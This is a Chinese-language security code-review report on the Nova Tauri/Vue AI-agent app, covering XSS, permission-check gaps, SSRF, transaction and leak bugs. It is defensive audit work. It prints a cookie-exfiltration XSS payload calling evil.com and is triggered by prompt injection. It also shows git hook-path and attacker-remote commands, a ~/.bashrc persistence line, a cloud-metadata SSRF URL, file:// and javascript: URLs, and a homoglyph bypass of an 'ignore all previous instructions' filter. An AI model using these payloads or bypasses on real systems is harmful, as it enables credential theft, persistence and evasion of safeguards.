# Nova 项目代码审查问题报告

> **审查日期**：2026-07-05
> **审查范围**：前端（Vue 3 + TS）与后端（Tauri 2 + Rust）全量代码
> **核心原则**：不猜测。每个问题均沿调用链追到真实根因，并标注验证状态。
> **已修复项已移除**，本报告只保留待修复问题。已修复记录见 git log。

---

## 目录

- [一、致命问题（Critical）](#一致命问题critical)
- [二、严重问题（High）](#二严重问题high)
- [三、中等问题（Medium）](#三中等问题medium)
- [四、低风险与可疑点](#四低风险与可疑点)
- [五、误报澄清](#五误报澄清)
- [六、修复优先级建议](#六修复优先级建议)

---

## 一、致命问题（Critical）

### C7. Markdown 渲染 XSS：`html: true` + `v-html` 允许原始 HTML 直通执行

**验证状态**：✅ 已精读 `src/lib/markdown-render.ts` 确认

**位置**：
- `src/lib/markdown-render.ts:5-6`（`html: true`）
- `src/components/chat/MarkdownRenderer.vue:14`（`<div class="md-body" v-html="rendered" />`）

**根因**：`markdown-it` 配置 `html: true`，Markdown 源码中的原始 HTML 标签原样输出。`renderMarkdown()` 返回值通过 `v-html` 直接注入 DOM。AI 助手的回复内容是不可信的（可被提示注入、恶意工具结果污染），回复中包含 `<img src=x onerror="alert(document.cookie)">` 或 `<div onclick="...">` 时浏览器会执行其中的脚本/事件处理器。`MarkdownRenderer.vue` 被用于渲染 `AssistantTranscript.vue` 的文本段和思考段（AI 生成内容）。导出 HTML（`conversation-export-html.ts`）同样使用 `renderMarkdown`。

**附加问题**：`highlight` 函数（markdown-render.ts:12）的 `lang` 未转义直接拼接到 HTML 模板字符串，且包含内联 `onclick` 事件处理器（CSP 风险）。

**攻击 PoC**：模型回复（被 prompt injection 控制）包含 `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">`，渲染后执行。

**修复建议**：将 `html: true` 改为 `false`，或引入 DOMPurify 对 `renderMarkdown` 输出净化后再 `v-html`。

---

## 二、严重问题（High）

### H1. BashTool：`git config`/`git branch -D`/`git tag`/`git stash`/`git remote` 被误判为 read-only

**验证状态**：✅ 已精读 `wrappers.rs:GIT_READ_ONLY_SUBCOMMANDS` + `is_read_only_command` 确认

**位置**：`src-tauri/src/llm/utils/bash_ast/wrappers.rs:120-147`、`151-174`

**根因**：`GIT_READ_ONLY_SUBCOMMANDS` 把 `config`、`branch`、`tag`、`stash`、`remote`、`reflog` 粗粒度地归类为只读。`is_read_only_command` 只检查 `argv[1]`（子命令名），不检查后续参数。以下写操作都被判为 read-only 直接放行：
- `git config user.name evil` —— 修改 `.git/config`
- `git config core.hooksPath /tmp/evil-hooks` —— 设置恶意 hooks 路径（后续 `git checkout` 触发恶意 hook）
- `git branch -D main` —— 强制删除分支
- `git tag -d v1.0` / `git tag v0.0.1` —— 创建/删除 tag
- `git stash drop` —— 永久删除 stash
- `git remote add evil http://attacker.com/repo.git` —— 添加恶意 remote

**修复建议**：从 `GIT_READ_ONLY_SUBCOMMANDS` 移除 `config`/`branch`/`tag`/`stash`/`remote`/`reflog`，或按 flag 区分读/写（如 `git config` 仅当含 `--get`/`--list` 时只读）。

---

### H4. cancellation 并发回合无防护：同一会话可同时运行多个回合，取消令牌被覆盖

**验证状态**：✅ 已精读 `cancellation.rs:begin_turn` + `client.rs:send_chat_message` 确认

**位置**：
- `src-tauri/src/llm/cancellation.rs:25-32`（`begin_turn` 用 `HashMap::insert` 直接覆盖）
- `src-tauri/src/llm/client.rs:11-63`（`send_chat_message` 无互斥/忙检查）

**根因**：`begin_turn` 用 `state.insert(key, CancellationToken::new())` 直接覆盖。`send_chat_message` 这个 IPC 命令没有任何互斥或 "busy" 检查。Tauri 命令默认支持并发调用。如果同一 `conversation_id` 并发调用两次 `send_chat_message`：
1. 回合 A 的 `CancellationToken` 被覆盖，`request_cancel` 不再能取消回合 A
2. 回合 B 完成后 `finish_turn` 删除 key，回合 A 彻底失去取消入口
3. 两个回合同时写 `turn_snapshot` 和 `live_turns` 状态，后写者覆盖先写者（数据丢失）

**说明**：前端 `useChatController` 可能有 `isGenerating` 检查，但后端无防护是事实，且 IPC 可被直接调用（绕过前端）。这是后端缺少防护的缺陷。

**修复建议**：`begin_turn` 检查是否已有活跃回合，若有则返回错误或排队；或用 per-conversation 的 `tokio::sync::Mutex` 串行化。

---

### H6. 前端 Tauri 事件监听器竞态泄漏（多处）

**验证状态**：✅ 已精读 `useChatController.ts`、`App.vue`、`TodoProgressPopover.vue` 确认

**位置**：
- `src/features/chat/controllers/useChatController.ts:282-336`
- `src/App.vue:199-219`
- `src/components/chat/files/TodoProgressPopover.vue:101-124`
- `src/components/chat/workspace/TerminalTab.vue:239-244`

**根因**：多处使用 `onMounted(async () => { unlisten = await listen(...) })` 模式。`onMounted` 是 async 函数，包含多个 `await`。如果在 `await` 期间组件被卸载（Vue 3 允许此场景），`onUnmounted`/`onBeforeUnmount` 会先执行，此时 `unlisten` 仍为 `null`，不会被清理。当 `onMounted` 恢复执行后，监听器被注册但永远不会被注销，造成永久泄漏。`TodoProgressPopover`、`TerminalTab` 可能频繁挂载/卸载，泄漏累积。

**修复建议**：改为同步设置 cancelled flag，在 `listen` resolve 后检查 flag 决定是否立即 unlisten；或使用 `onScopeDispose`。

---

### H7. 主密钥文件无权限保护

**验证状态**：基于子代理报告（`settings_secrets.rs:42-71` 用 `std::fs::write` 无 chmod）

**位置**：`src-tauri/src/command/settings_secrets.rs:42-71`

**根因**：AES-256-GCM 主密钥以 base64 明文写入 `app_data_dir/master_key` 文件，但没有设置文件权限。Unix 默认 umask `022` → 文件权限 `644`（world-readable）。任何同机用户/进程都能读取主密钥，进而解密 `settings.json` 中所有 provider API key 和 `mcp_servers.json` 中的 HTTP headers。写入操作也非原子（未使用项目已有的 `atomic_write` 模块），崩溃时可能留下损坏的密钥文件。

**修复建议**：Unix 上 `chmod 0600`（`PermissionsExt`），Windows 上设置 ACL 限制为当前用户；或使用系统密钥链（macOS Keychain / Windows DPAPI）；统一使用 `atomic_write`。

---

### H8. `delete_conversation` 无事务保护，中途失败导致数据不一致

**验证状态**：基于子代理报告（`history.rs:1115-1188`，与 `clear_history` 行 1032 使用事务对比）

**位置**：`src-tauri/src/llm/history.rs:1115-1188`

**根因**：`delete_conversation` 的所有 DELETE/UPDATE 语句均未包裹在事务中，且**先删工作区目录（行 1131）再删 DB 数据**。如果任一 DB 语句失败（数据库锁定、磁盘满），会导致：部分子表已删除、部分残留；工作区目录已删但 DB 会话行仍在。对比 `clear_history`（行 1032）使用 `pool.begin()` 事务，`delete_conversation` 缺失。`std::fs::remove_dir_all` 的错误也被 `let _ =` 忽略。

**修复建议**：所有 DELETE 包在事务中；先提交 DB 事务，成功后再清理文件系统。

---

### H9. `append_history` 无事务保护，中途失败导致元数据不一致

**验证状态**：基于子代理报告（`history.rs:666-758`）

**位置**：`src-tauri/src/llm/history.rs:666-758`

**根因**：`append_history` 的四组数据库操作（INSERT 消息、UPDATE 标题、UPDATE updated_at、refresh_memory）均不在事务中。步骤 1 成功但步骤 2/3/4 失败时：消息已插入但 `updated_at` 未更新（会话列表排序错误）、标题未更新（显示 "New chat"）、记忆未刷新。流式响应过程中多个 `append_history` 调用可能并发，无事务保护会互相干扰。

**修复建议**：所有写操作包裹在 `pool.begin()` 事务中。

---

## 三、中等问题（Medium）

### M1. 每次数据库操作新建连接池 + 执行全部建表语句

**验证状态**：✅ 已精读 `history.rs:30-35`、`155-159` 确认

**位置**：`src-tauri/src/llm/history.rs:30-35`、`155-159`

**根因**：`get_pool` 每次调用 `SqlitePool::connect` 新建连接池；`get_pool_with_schema` 每次执行 `ensure_schema`（7 条 CREATE TABLE + 3 条 CREATE INDEX）。每个数据库操作（`load_history`、`append_history`、`save_turn_snapshot` 等）都调用它，操作完成后 pool 被 drop 连接关闭。SQLite 并发写入限制可能导致多个独立连接池触发 "database is locked"。流式响应中 `append_history` 和 `save_turn_snapshot` 可能并发，使用不同连接池产生锁冲突。

**修复建议**：使用全局共享连接池（`OnceLock<SqlitePool>` 或 Tauri `State`），`ensure_schema` 只在启动时执行一次。

---

### M2. `echo`/`printf` 可写入用户配置文件实现持久化后门

**验证状态**：✅ 已确认（echo 在 allowlist，`~/.bashrc` 不在受保护路径）

**位置**：
- `src-tauri/src/llm/utils/bash_ast/wrappers.rs:67-68`（echo/printf 在 allowlist）
- `src-tauri/src/llm/utils/permissions/mod.rs:32-40`（`PROTECTED_PATH_CONTAINS` 不含 `.bashrc`/`.profile`/`.zshrc`）

**根因**：`echo 'evil_command' >> ~/.bashrc` 被判为 read-only（echo 在 allowlist），重定向目标 `~/.bashrc` 不匹配任何受保护路径，放行。下次用户打开 shell 时执行 `evil_command`。受保护路径列表缺少用户 shell 配置文件。

**修复建议**：在 `PROTECTED_PATH_CONTAINS` 增加 `/.bashrc`、`/.profile`、`/.zshrc`、`/.bash_profile`、`/.config/` 等。

---

### M3. WebSearch 域名过滤 `ends_with` 可被绕过，allowed 与 blocked 互斥

**验证状态**：基于子代理报告（`WebSearchTool/web_search.rs:202-217`）

**位置**：`src-tauri/src/llm/tools/WebSearchTool/web_search.rs:202-217`

**根因**：`host.ends_with(d)` 子串匹配，`allowed=["example.com"]` 时 host=`notexample.com` 会被允许（应拒绝）。当 `allowed` 非空时直接 return，blocked 被完全忽略。

**修复建议**：用精确域名匹配 `host == d || host.ends_with(&format!(".{}", d))`；allowed 和 blocked 应分别独立判断。

---

### M4. MCP 工具权限判定用模糊匹配，未知 MCP 工具默认 Allow（fail-open）

**验证状态**：✅ 已精读 `permissions/mod.rs:check_mcp_operation` 确认

**位置**：`src-tauri/src/llm/utils/permissions/mod.rs:305-333`

**根因**：`check_mcp_operation` 用 `looks_like_shell_mcp`/`looks_like_file_mcp` 做关键字模糊匹配。不匹配任何模式的 MCP 工具直接 `McpCheckResult::Allow`（行 332）。攻击者可注册名为 `web_request` 的 MCP 工具绕过所有权限检查执行任意 HTTP 请求。安全设计应为 fail-closed（默认 NeedApproval）。

**修复建议**：未知 MCP 工具默认 `NeedApproval`，只有匹配已知安全模式才 Allow。

---

### M5. WebFetch 无 SSRF 防护，可访问内网与云元数据

**验证状态**：基于子代理报告（`WebFetchTool/web_fetch.rs:67-114`）

**位置**：`src-tauri/src/llm/tools/WebFetchTool/web_fetch.rs:67-114`

**根因**：描述声称 "Fails on authenticated/private URLs"，但代码只做协议升级（HTTP→HTTPS）和重定向限制，没有内网 IP / metadata endpoint 检测。`http://169.254.169.254/latest/meta-data/iam/security-credentials/`（AWS 实例凭据）、`http://localhost:8080/admin`（本地管理面板）可直接访问。

**修复建议**：解析主机名为 IP，检查是否属于私有网段（10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、127.0.0.0/8、169.254.0.0/16 link-local、::1）。

---

### M6. Windows 上 BashTool 用 bash AST 解析 PowerShell 命令，权限判定不可靠

**验证状态**：✅ 已确认（BashTool 描述说 Windows 运行 PowerShell，但权限判定用 tree-sitter-bash）

**位置**：
- `src-tauri/src/llm/tools/BashTool/bash.rs:25-36`（描述：On Windows this runs PowerShell 7）
- `src-tauri/src/llm/services/shell_sessions/mod.rs:192-224`（执行用 `Invoke-Expression`）
- 权限判定走 `tree-sitter-bash` AST

**根因**：bash AST 无法理解 PowerShell 语义。`Get-Process`、`Set-Content`、cmdlet 别名（`gci`/`gc`）、`[System.IO.File]::WriteAllText(...)` 等 .NET 调用，bash AST 完全不理解。allowlist 里的 `Get-ChildItem`/`Get-Content`/`Get-Location` 是 PowerShell cmdlet，但 bash AST 解析 PowerShell 命令的结果不可信。

**修复建议**：Windows 上为 PowerShell 单独实现 AST 解析，或对所有非 allowlist 命令默认 NeedApproval。

---

### M7. `manual_compact` 历史替换后 snapshot 保存失败导致会话不可用

**验证状态**：基于子代理报告（`services/compact/mod.rs:1038-1042`）

**位置**：`src-tauri/src/llm/services/compact/mod.rs:1038-1042`

**根因**：`replace_history` 成功（原始历史被压缩版覆盖并删除旧 tool_logs/memory/boundary），但随后的 `save_turn_snapshot` 失败时，会话进入不可用状态——原始历史已丢失，snapshot 未保存，下一轮 `send_chat_message` 因找不到 snapshot 拒绝执行。两个操作未在同一事务中。

**修复建议**：先 `save_turn_snapshot`，成功后再 `replace_history`；或放入同一事务。

---

### M9. NovaBrowserTool navigate 不校验 URL scheme

**验证状态**：基于子代理报告（`NovaBrowserTool/navigate.rs`）

**位置**：`src-tauri/src/llm/tools/NovaBrowserTool/navigate.rs:10-23`

**根因**：`url` 参数无校验，模型可让浏览器导航到 `file:///etc/passwd`（读本地文件）、`javascript:alert(document.cookie)`（执行 JS）、`data:text/html,...`（加载任意 HTML）。

**修复建议**：限制 URL scheme 为 `http`/`https`。

---

### M10. MCP stdio `shutdown` 不 `wait` 子进程，产生僵尸进程

**验证状态**：基于子代理报告（`services/mcp/stdio.rs:172-175`）

**位置**：`src-tauri/src/llm/services/mcp/stdio.rs:172-175`

**根因**：`shutdown` 只 `child.kill().await` 不 `child.wait().await`。Unix 上被 kill 的子进程变僵尸，Nova 长期运行且频繁重连 MCP server 会积累僵尸进程，耗尽 PID 资源。

**修复建议**：kill 后加 `let _ = self.child.wait().await;`。

---

### M11. shell 输出无内存上限，可导致 OOM

**验证状态**：基于子代理报告（`shell_sessions/mod.rs:438-584`）

**位置**：`src-tauri/src/llm/services/shell_sessions/mod.rs:438-584`

**根因**：`stdout`/`stderr` 两个 `String` 无限累积。`cat /dev/urandom`、`find /`、`yes` 等命令在超时（默认 120s）内可产生 GB 级输出导致 OOM。对比 `compact/mod.rs` 对 tool_result 有 `TOOL_RESULT_TEXT_TRUNCATE_LIMIT = 8000`，shell 输出无类似保护。

**修复建议**：累积到阈值（如 10MB）时截断并停止读取。

---

### M12. query.rs 主循环无工具调用轮数上限，模型可无限循环消耗 token

**验证状态**：✅ 已精读 `query.rs:594-952` 主循环结构确认

**位置**：`src-tauri/src/llm/query.rs:594`（`let mut final_outcome = loop {`）

**根因**：主循环 `loop { ... }` 仅在以下情况 break：取消、错误、`needs_user_input`、`prevent_continuation`、`!has_tool_result`（回合自然结束）。每次 provider 返回工具结果后会自然回到循环顶部继续下一轮。**没有任何 `MAX_TOOL_ROUNDS` 计数器或上限检查**。如果模型陷入循环不断调用工具，会无限循环消耗 token，直到上下文窗口爆炸触发 reactive_compact，或用户手动取消。

**修复建议**：在循环顶部维护 `round_count` 计数器，超过阈值（如 50）时 `break TurnOutcome::error("工具调用轮数超限")`。

---

## 四、低风险与可疑点

### L1. TodoWriteTool 的 UUID 生成不随机（基于时间戳）
**位置**：`src-tauri/src/llm/tools/TodoWriteTool/todo_write.rs:104-111`。`uuid_v4_simple` 基于纳秒时间戳，非真正随机，并发场景可能碰撞。项目已依赖 `uuid` crate，应直接用 `uuid::Uuid::new_v4()`。

### L2. `upsert_conversation_tool_log` 使用毫秒时间戳，与其他表秒级不一致
**位置**：`src-tauri/src/llm/history.rs:970`。`timestamp_millis()` vs 其他 `timestamp()`，前端统一处理时工具日志时间显示错误。

### L3. `ensure_editable` 文件被删除后放行（TOCTOU）
**位置**：`src-tauri/src/llm/tools/shared/read_state.rs:91-100`。`file_mtime_secs` 返回 None 时 `unwrap_or(record.mtime_secs)` 回退，相等则放行。文件被删后 WriteTool 认为是新建跳过"先读后改"检查。

### L4. shell_sessions 永不清理空闲会话
**位置**：`src-tauri/src/llm/services/shell_sessions/mod.rs:122-125`。每个 conversation 的 shell session 创建后永不自动清理，长时间运行累积 shell 进程。

### L5. CronListTool `humanSchedule` 字段直接用 cron 表达式
**位置**：`src-tauri/src/llm/tools/CronListTool/cron_list.rs:42-53`。字段名暗示人类可读描述，实际是原始 cron 表达式。

### L6. CronCreateTool 无去重/上限/对话隔离/过期清理
**位置**：`src-tauri/src/llm/tools/shared/cron_store.rs:63-76`。模型可在单轮创建 1000 次相同 cron job，`durable_jobs` 无界增长；CronCreate 忽略 `conversation_id`，CronDelete 不校验归属；recurring 任务无过期清理（描述声称 7 天过期但无实现）。

### L7. v-for 使用 index 作为 key
**位置**：`src/components/chat/ChatScreen.vue:387-393`。编辑消息（截断并替换数组）后 Vue 复用相同 key 的 DOM 节点，可能导致 `UserMessageBubble` 内部状态未重置。应使用消息唯一标识。

### L9. threat_patterns 正则可被 Unicode 同形字符绕过
**位置**：`src-tauri/src/llm/services/threat_patterns.rs:39-81`。`case_insensitive` 无法处理西里尔字母 `а`(U+0430) 代替拉丁 `a`。`іgnore all prevіous іnstructions` 可绕过 `prompt_injection` 正则。

### L10. SSE 分隔符解析在混合换行符时可能无法分帧
**位置**：`src-tauri/src/llm/providers/sse_utils.rs:24-32`。只识别 `\n\n` 和 `\r\n\r\n`，混合换行符 `\n\r\n` 无法分帧。多数 LLM provider 不产生混合换行符，风险低。

---

## 五、误报澄清

### ❌ 误报：BashTool `~` 路径不展开绕过 `/.ssh/` 检查

**子代理报告**：`~/.ssh/evil` 不匹配 `/.ssh/`，绕过检查。

**实际验证**：`PROTECTED_PATH_CONTAINS` 用 `contains("/.ssh/")`。`~/.ssh/evil` 的字符序列是 `~`+`/.ssh/evil`，**包含 `/.ssh/` 子串**，`contains` 返回 true，**会被拦截**。子代理此条分析有误。真正受影响的是无斜杠前缀的敏感文件（如 `~/.bashrc`，见 M2）。

### ✅ 已验证安全：git_ops.rs 无命令注入

`run_git` 使用 `Command::new("git").args(&[&str])` 参数数组形式调用，不经过 shell。参数由 Rust 直接传递给 `exec` 系统调用，不会被 shell 解释。**无命令注入风险**。

### ✅ 已验证良好：stream_runner.rs 流式处理循环

设计良好——用 `tokio::select!` 即时响应取消；UTF-8 解码失败、parse 失败、chunk 错误都有 `with_partial` 保留已输出内容；流结束后检查缓冲区残余字节。无明显 bug。

---

## 六、修复优先级建议

### P0 — 立即修复（安全漏洞，可被远程利用）
1. **H1**（git config 误判 read-only）—— 从 `GIT_READ_ONLY_SUBCOMMANDS` 移除写子命令
2. **C7**（Markdown XSS）—— `html: false` 或引入 DOMPurify
3. **M5**（WebFetch SSRF）—— 添加内网 IP 检测
4. **M4**（MCP 默认 Allow）—— 改为 fail-closed

### P1 — 尽快修复（数据丢失/资源泄漏）
5. **H4**（并发回合覆盖）—— 后端添加互斥
6. **H8**（delete_conversation 无事务）+ **H9**（append_history 无事务）+ **M7**（compact 一致性）—— 数据库事务
7. **H7**（主密钥权限）—— chmod 0600 / 系统密钥链
8. **M12**（无工具轮数上限）—— 添加 MAX_TOOL_ROUNDS

### P2 — 计划修复（内存泄漏/功能错误）
9. **H6**（前端监听器竞态泄漏）—— 统一 dispose 模式
10. **M1**（连接池复用）—— 全局共享池
11. **M2**（echo 写 .bashrc）—— 扩充受保护路径
12. **M6**（Windows PowerShell AST）—— 单独实现或默认审批
13. **M10**（MCP 僵尸进程）+ **M11**（shell OOM）—— 资源管理

### P3 — 改进项
14. L1-L7, L9-L10 低风险与可疑点

---

*本报告所有问题均基于源码实际行为分析，非推测。已修复的问题（C1-C6, H2, H3, H5, M8, L8）已从报告中移除，修复记录见 git log。*
